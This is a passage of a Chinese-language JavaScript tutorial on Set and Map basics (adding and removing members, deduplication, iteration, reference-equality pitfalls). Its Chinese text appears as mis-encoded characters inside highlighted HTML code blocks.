s.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>); <span class="hljs-comment">// å‘ Setä¸­æ·»åŠ æ•°å­—2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s);  
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfeff7c5e25f4dad9390532e842ae832~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=%2BDkBcdzQHURM9VMQoyVTavxLtr0%3D" alt="image.png" loading="lazy"/></p>
<p>ä½ ä¼šå‘ç°ï¼Œå’¦ï¼Ÿä¸ºå•¥æ‰“å°å‡ºçš„ç»“æœæ˜¯è¿™ä¸ªå¥‡æ€ªæ ·å­ï¼Ÿå‰é¢è¿˜æœ‰ä¸ª<code>Set(2)</code>æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Œå…¶å®è¿™æ˜¯æ§åˆ¶å°å¯¹ <strong>Set å®ä¾‹</strong>çš„ <strong>â€œå‹å¥½æç¤ºâ€</strong>â€”â€”<code>Set(2)</code>è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåŒ…å« 2 ä¸ªæˆå‘˜çš„ Set é›†åˆï¼Œåé¢è·Ÿç€çš„<code>{1, 2}</code>æ‰æ˜¯ Set é‡Œçš„å…·ä½“æˆå‘˜ï¼Œå¹¶ä¸æ˜¯æ‰“å°ç»“æœ â€œå¥‡æ€ªâ€ï¼Œè€Œæ˜¯æ§åˆ¶å°ä¸ºäº†è®©ä½ ç›´è§‚çœ‹åˆ° Set çš„ç±»å‹å’Œé•¿åº¦ï¼Œç‰¹æ„åšçš„æ ¼å¼å±•ç¤ºï½ï¼Œè¿™ä¹Ÿå°è¯äº†<code>Set</code>ä¸å±äºæ•°ç»„ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¦‚æœç”¨è§£æ„çš„æ–¹æ³•å°±ä¸ä¼šæœ‰å‰é¢çš„ä¸œè¥¿ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(...s);   <span class="hljs-comment">// ç›´æ¥è¾“å‡ºæˆå‘˜ï¼š1 2ï¼ˆè§£æ„ä¸ºç‹¬ç«‹å‚æ•°ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([...s]); <span class="hljs-comment">// è¾“å‡ºæ•°ç»„ï¼š[1, 2]ï¼ˆè½¬æ¢ä¸ºæ™®é€šæ•°ç»„ï¼‰</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2f8aedeac244212bb1f558a2f103980~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=fhTlUvrNpB1UfUxnbCxzcMkPKsI%3D" alt="image.png" loading="lazy"/></p>
<p>ç®€å•è¯´ï¼Œ<code>Set(2)</code>åªæ˜¯æ§åˆ¶å°çš„ â€œç±»å‹æ ‡ç­¾â€ï¼Œä¸æ˜¯ Set æœ¬èº«çš„å†…å®¹ï¼ŒçœŸæ­£çš„æˆå‘˜å°±æ˜¯<code>1</code>å’Œ<code>2</code>ï¼Œè¿™ä¹Ÿæ˜¯ Set å’Œæ•°ç»„<strong>åœ¨æ§åˆ¶å°å±•ç¤ºçš„æ ¸å¿ƒåŒºåˆ«ï½</strong></p>
<p><strong>åœ¨ä¸€èµ·çœ‹çœ‹<code>delete</code>ã€<code>has</code>ã€<code>clear</code>ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]);
s.<span class="hljs-title function_">delete</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// åˆ é™¤ Setä¸­çš„å…ƒç´ 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s);  <span class="hljs-comment">// è¾“å‡º Set(4) { 1, 3, 4, 5 },æ²¡æœ‰ 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-title function_">has</span>(<span class="hljs-number">3</span>));  <span class="hljs-comment">// åˆ¤æ–­ Setä¸­æ˜¯å¦å­˜åœ¨å…ƒç´  3ï¼Œture</span>
s.<span class="hljs-title function_">clear</span>();  <span class="hljs-comment">// æ¸…ç©º Setä¸­çš„æ‰€æœ‰å…ƒç´ ï¼ŒSet(0) {}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s);
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9be42dd020e454cb9d63c8aa738f101~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=%2B1dKygiHGZ91AqFtBZSV%2FszGx%2BE%3D" alt="image.png" loading="lazy"/></p>
<p>â—ï¸â­å½“ç„¶è¿™é‡Œæœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹ï¼šå¦‚æœç”¨<code>has</code>åˆ¤æ–­<code>[]</code>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]);
s.<span class="hljs-title function_">add</span>([]);  <span class="hljs-comment">// å¢åŠ ä¸€ä¸ª[]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-title function_">has</span>([]));  <span class="hljs-comment">// falseï¼Œå¼•ç”¨åœ°å€ä¸ä¸€æ ·</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f19bc0d9ddde467fa9668e8ef9858422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=2Q56S8MFfy6QOPCi0sD8u4RQ%2Bq8%3D" alt="image.png" loading="lazy"/></p>
<p>ä»»ä½•æ¶‰åŠåˆ°å¼•ç”¨åœ°å€çš„ï¼Œéƒ½ä¼šåˆ¤æ–­ä¸º<code>false</code>ï¼Œ<strong>æ ¸å¿ƒåŸå› </strong>å°±æ˜¯å¼•ç”¨ç±»å‹çš„ <strong>â€œåœ°å€å”¯ä¸€æ€§â€</strong>ï¼Œæ•°ç»„æ˜¯å¼•ç”¨ç±»å‹ï¼Œæ¯ä¸€æ¬¡Â <code>[]</code>Â éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå…¨æ–°çš„ã€<strong>å†…å­˜åœ°å€ä¸åŒ</strong>çš„æ•°ç»„å¯¹è±¡ã€‚</p>
<p>Set çš„Â <code>has</code>Â æ–¹æ³•åˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨æ—¶ï¼Œå¯¹äºå¼•ç”¨ç±»å‹ï¼ˆæ•°ç»„ã€å¯¹è±¡ç­‰ï¼‰ï¼Œæ˜¯é€šè¿‡ <strong>â€œå†…å­˜åœ°å€æ˜¯å¦ä¸€è‡´â€</strong> æ¥åˆ¤æ–­ï¼Œè€Œéå€¼æ˜¯å¦ç›¸åŒã€‚å› æ­¤Â <code>has([])</code>Â æ‰¾ä¸åˆ°ä¹‹å‰æ·»åŠ çš„é‚£ä¸ªæ•°ç»„ï¼Œæœ€ç»ˆè¿”å›Â <code>false</code>ã€‚</p>
<p><strong>æœ€åå°±æ˜¯ç”¨<code>size</code>è·å¾—<code>set</code>çš„é•¿åº¦ï¼ˆä¸è¦æŠŠæ•°ç»„çš„<code>length</code>ææ··å“¦âš ï¸ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-property">size</span>);
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2f1ee6dced34bbbb63f4eeb4a12c24c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=OBIKR0M768MaImCiyHNYsf0%2BVfo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">2. æœ€å®ç”¨æŠ€èƒ½ï¼šæ•°ç»„å»é‡ï¼</h4>
<p>è¿™ç»å¯¹æ˜¯ <code>Set</code> çš„ <strong>â€œæˆåä½œâ€</strong>ï¼Œä¸€è¡Œä»£ç è§£å†³æ•°ç»„é‡å¤é—®é¢˜ï¼Œæˆ‘ä»¬å¤§éƒ¨åˆ†æ—¶å€™ç”¨<code>Set</code>ç›®çš„å°±æ˜¯ä¸ºäº†å»é‡ï¼Œå¥½ç”¨çš„é£èµ·ï¼Œä¸éœ€è¦å†ç”¨<code>for</code>ä¸€ä¸ªä¸€ä¸ªéå†å•¦ï¼</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> arr2 = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr)];  <span class="hljs-comment">// Set é‡Œé¢æ˜¯å…è®¸å­˜æ”¾æ•°ç»„çš„ï¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);  <span class="hljs-comment">// è§£æ„çš„ç»“æœä¸º [ 1, 2, 3 ]</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebc29646d0f54e9a9de7991ff8ae08fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=BEMXv5SnEQMPgBAvmjZS%2Bv0BPMc%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ä¸åªæ˜¯æ•°ç»„ï¼Œå­—ç¬¦ä¸²ä¹Ÿèƒ½å»é‡ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> str = <span class="hljs-string">'abcba'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(str));
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a6dc82c83e84c14868a16bac9349840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=Cv4zW7jx2y0av18j%2Fuedvpf3b3s%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">3. éå† Setï¼škeys/values/entries/forEachï¼Œå…¶å®éƒ½å·®ä¸å¤šğŸ˜</h4>
<p>Set é‡Œçš„ <strong>â€œé”®â€ å’Œ â€œå€¼â€</strong> æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼ˆæ¯•ç«Ÿå®ƒæ˜¯<strong>å•å€¼é›†åˆ</strong>ï¼‰ï¼Œæ‰€ä»¥<code>keys()</code>å’Œ<code>values()</code>éå†å‡ºæ¥çš„ç»“æœä¸€æ¯›ä¸€æ ·ã€‚çœ‹ä¼¼èŠ±é‡Œèƒ¡å“¨ï¼Œå®åˆ™é€»è¾‘è¶…ç®€å•ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>]);

<span class="hljs-comment">// 1. keys()ï¼šè·å–Setçš„â€œé”®â€ï¼ˆSetçš„é”®å’Œå€¼æ˜¯åŒä¸€ä¸ªï¼‰</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> key <span class="hljs-keyword">of</span> set.<span class="hljs-title function_">keys</span>()){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// ä¾æ¬¡è¾“å‡ºaã€bã€c</span>
}

<span class="hljs-comment">// 2. values()ï¼šè·å–Setçš„å€¼ï¼Œå’Œkeys()ç»“æœå®Œå…¨ä¸€è‡´</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> val <span class="hljs-keyword">of</span> set.<span class="hljs-title function_">values</span>()){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val); <span class="hljs-comment">// ä¾æ¬¡è¾“å‡ºaã€bã€c</span>
}

<span class="hljs-comment">// 3. entries()ï¼šè¿”å›[key, value]å½¢å¼çš„è¿­ä»£å™¨ï¼Œé”®å€¼ç›¸åŒ</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> set.<span class="hljs-title function_">entries</span>()){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item); <span class="hljs-comment">// ä¾æ¬¡è¾“å‡º['a','a']ã€['b','b']ã€['c','c']</span>
}

<span class="hljs-comment">// 4. forEachéå†ï¼šå’Œæ•°ç»„forEachç”¨æ³•ä¸€è‡´</span>
set.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">val, key</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key + <span class="hljs-string">':'</span> + val); <span class="hljs-comment">// ä¾æ¬¡è¾“å‡ºa:aã€b:bã€c:c</span>
});
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0317af667d945709c0267fa1fd6ed17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=RU%2By%2BbvcvRg3uaMMgM%2BTZ6ooSmQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-5">4. âš  éå†ä¸æ”¹å˜åŸæ•°ç»„ï¼returnè¿”å›ä¹Ÿæ²¡ç”¨ï¼âš ï¸</h4>
<p>å½“æˆ‘ä»¬æŠŠ <code>Set</code> å’Œ <code>forEach</code> çš„ç‰¹æ€§ç»“åˆèµ·æ¥æ—¶ï¼Œè¿˜èƒ½å‘ç°æ›´å¤šæœ‰è¶£çš„ç»†èŠ‚ â€”â€” æ¯”å¦‚ç”¨ Set å¯¹æ•°ç»„å»é‡åï¼Œå†é€šè¿‡ forEach ä¿®æ”¹æ•°ç»„å…ƒç´ ï¼Œä¾ç„¶è¦éµå¾ª <strong>â€œç›´æ¥æ”¹ item æ— æ•ˆã€éœ€é€šè¿‡ç´¢å¼•ä¿®æ”¹åŸæ•°ç»„â€</strong> çš„è§„åˆ™ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, i, array</span>) =&gt;</span> {
    item *= <span class="hljs-number">10</span>;  <span class="hljs-comment">// ç›´æ¥ä¿®æ”¹æ˜¯æ²¡ç”¨æ»´ï¼</span>
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// è¿˜æ˜¯è¾“å‡º [1, 2, 3]</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/081d97ddb1df4dd5a81d1f19d3f75038~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=pDjhKJwNU%2BoO2Gj67VbDgcP14pY%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, i, array</span>) =&gt;</span> {
    arr[i] = item * <span class="hljs-number">10</span>;  <span class="hljs-comment">// å¿…é¡»é€šè¿‡ç´¢å¼•ï¼</span>
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// è¾“å‡º [10, 20, 30]</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/604452c8366348888dce906dea09a4e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=VXIltqC%2BrDwGWcrIwd779UGRKdQ%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸” <code>forEach</code> é‡Œçš„ <code>return</code> ä¹Ÿä¾æ—§<strong>æ— æ³•ç»ˆæ­¢éå†</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, i, array</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">2</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æ­£å¸¸æ‰“å°å®Œ 1å°±é€€å‡ºï¼Œä½†æ˜¯ç»“æœä¸º 1,2</span>
    }
})
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3a8e6b9e7ab45949aa2271005d32a44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=X6fwyP4wzvNMnn1BzkRNEApsn1o%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™æ®µä»£ç æ—¢ä½“ç° <strong>Set â€œæˆå‘˜å”¯ä¸€â€</strong> çš„æ ¸å¿ƒç‰¹æ€§ï¼Œåˆå®Œæ•´å¤ç°äº† forEach ä¿®æ”¹æ•°ç»„çš„å…³é”®è§„åˆ™ â€”â€” ç›´æ¥æ“ä½œ item æ— æ³•æ”¹å˜åŸæ•°ç»„ã€return ä»…ç»ˆæ­¢å½“å‰å¾ªç¯è€Œéæ•´ä¸ªéå†ï¼ŒæŠŠ Set å’Œ forEach çš„æ ¸å¿ƒé€»è¾‘ç´§å¯†ä¸²è”äº†èµ·æ¥ã€‚</p>
<h4 data-id="heading-6">5.ğŸŒˆåˆ¤æ–­èƒ½å¦éå†çš„å°æŠ€å·§</h4>
<p>å‡è®¾ä½ ä¸çŸ¥é“<code>Set</code>å¯ä»¥éå†ï¼Œé‚£æ€ä¹ˆåˆ¤æ–­å‘¢ï¼Ÿä¸€æ‹›æå®šï¼Œé‚£å°±æ˜¯ç›´æ¥å»æµè§ˆå™¨ä¸Šæ‰“å°å‡ºä¸€ä¸ª<code>Set</code>å¯¹è±¡ï¼Œçœ‹çœ‹é‡Œé¢æœ‰æ²¡æœ‰<code>iterator</code>è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æœæœ‰ï¼Œé‚£å°±ğŸ‘Œ(^o^)/~ï¼Œå¤§èƒ†æ”¾å¿ƒéå†ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b82d8b7f10e6483383fa09d558590d78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=Q1lmThNkWG450UBGkgf7nKMt13M%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">äºŒã€Mapï¼šä¼ ç»Ÿå¯¹è±¡çš„ â€œè¶…çº§è¿›åŒ–ç‰ˆâ€ï¼Œkey æƒ³æ”¾å•¥å°±æ”¾å•¥</h3>
<p>ä¼ ç»Ÿ JS å¯¹è±¡çš„ç—›ç‚¹ï¼š<strong>key åªèƒ½æ˜¯å­—ç¬¦ä¸²æˆ– Symbol</strong>ï¼Œæƒ³æ‹¿å¯¹è±¡å½“ <code>key</code>ï¼Ÿé—¨éƒ½æ²¡æœ‰ï¼ä½† <code>Map</code> ç›´æ¥æ‰“ç ´è¿™ä¸ªé™åˆ¶ â€”â€” <strong>æ•°å­—ã€æ•°ç»„ã€å¯¹è±¡ã€ç”šè‡³ null å’Œ undefined</strong>ï¼ å•¥éƒ½èƒ½å½“ keyï¼Œå ªç§° <strong>â€œä¸‡èƒ½é”®å€¼å¯¹å®¹å™¨â€</strong>ã€‚</p>
<h4 data-id="heading-8">1. åŸºç¡€æ“ä½œï¼šset/get/has/size/delete/clearï¼ˆè·Ÿ<code>Map</code>å·®ä¸å¤šï¼ï¼‰</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-comment">// å„ç§å¥‡å¥‡æ€ªæ€ªçš„ key éƒ½èƒ½æ”¾</span>
m.<span class="hljs-title function_">set</span>(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>); <span class="hljs-comment">// keyæ˜¯å­—ç¬¦ä¸²</span>
m.<span class="hljs-title function_">set</span>([], <span class="hljs-number">1</span>); <span class="hljs-comment">// keyæ˜¯æ•°ç»„</span>
m.<span class="hljs-title function_">set</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// keyæ˜¯null</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-property">size</span>); <span class="hljs-comment">// Map çš„é•¿åº¦ï¼Œè¾“å‡º 3</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-title function_">get</span>(<span class="hljs-literal">null</span>)); <span class="hljs-comment">// è¾“å‡º 2ï¼Œç²¾å‡†å–åˆ° nullå¯¹åº”çš„å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-title function_">has</span>([])); <span class="hljs-comment">// è¾“å‡º falseï¼æ³¨æ„ï¼šæ•°ç»„æ˜¯å¼•ç”¨ç±»å‹ï¼Œè¿™é‡Œçš„[]å’Œsetçš„[]ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼</span>
m.<span class="hljs-title function_">delete</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// åˆ é™¤ keyä¸º nullçš„é¡¹</span>
m.<span class="hljs-title function_">clear</span>(); <span class="hljs-comment">// æ¸…ç©º Map</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/026c2376944e4cf7b2d238b01b6f5b4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=bli1YiWy%2BejCnDMVWsjmdunMdhk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">2. éå† Mapï¼šæ¯”å¯¹è±¡éå†çˆ½å¤šäº†</h4>
<p>Map å¤©ç”Ÿæ”¯æŒéå†ï¼Œä¸ç”¨åƒå¯¹è±¡é‚£æ · â€œè½¬æ•°ç»„å†éå†â€ã€‚å¥½æˆ‘ç°åœ¨å‡è®¾ä¸çŸ¥é“å¯ä»¥éå†ï¼Œå¤§å£°å‘Šè¯‰æˆ‘æ€ä¹ˆåŠï¼ŸğŸ˜®çœ‹æ¥ä½ ä¼šäº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26bc3950c972457080549563f95e4b46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=Z0argA6Di0nPUJ7%2Bjg4Bg4iUKsg%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">'name'</span>, <span class="hljs-string">'henry'</span>], [<span class="hljs-string">'age'</span>, <span class="hljs-number">18</span>]]);
<span class="hljs-comment">// ç›´æ¥ç”¨for...oféå†ï¼Œæ‹¿åˆ°[key, value]</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> [key, val] <span class="hljs-keyword">of</span> m) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, val); <span class="hljs-comment">// è¾“å‡ºname henryã€age 18</span>
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18a5113a32ad461991b410222a299322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=pPveh2CiGTE45aKKOkYjDdAhZes%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™é‡Œä¾æ—§è·Ÿ<code>Map</code>ä¸€æ ·çš„é—®é¢˜ <strong>ï¼ˆå¼•ç”¨åœ°å€ä¸åŒï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> arrKey = [];
<span class="hljs-keyword">const</span> m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
m.<span class="hljs-title function_">set</span>(arrKey, <span class="hljs-string">'æˆ‘æ˜¯æ•°ç»„é”®çš„å€¼'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-title function_">get</span>(arrKey)); <span class="hljs-comment">// è¾“å‡º"æˆ‘æ˜¯æ•°ç»„é”®çš„å€¼"ï¼ˆå¼•ç”¨åœ°å€ä¸€è‡´ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-title function_">get</span>([])); <span class="hljs-comment">// è¾“å‡ºundefinedï¼ˆæ–°æ•°ç»„ï¼Œåœ°å€ä¸åŒï¼‰</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dde716c5c56f43ebbaa8cfec01c861a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589367&amp;x-signature=N2A3ubSIYaeK%2BOecTcGucXyPaZY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">ä¸‰ã€WeakSet/WeakMapï¼šJS å†…å­˜çš„ â€œéšå½¢æ¸…æ´å·¥â€ï¼Œå¼±å¼•ç”¨å¤ªé¦™äº†</h3>
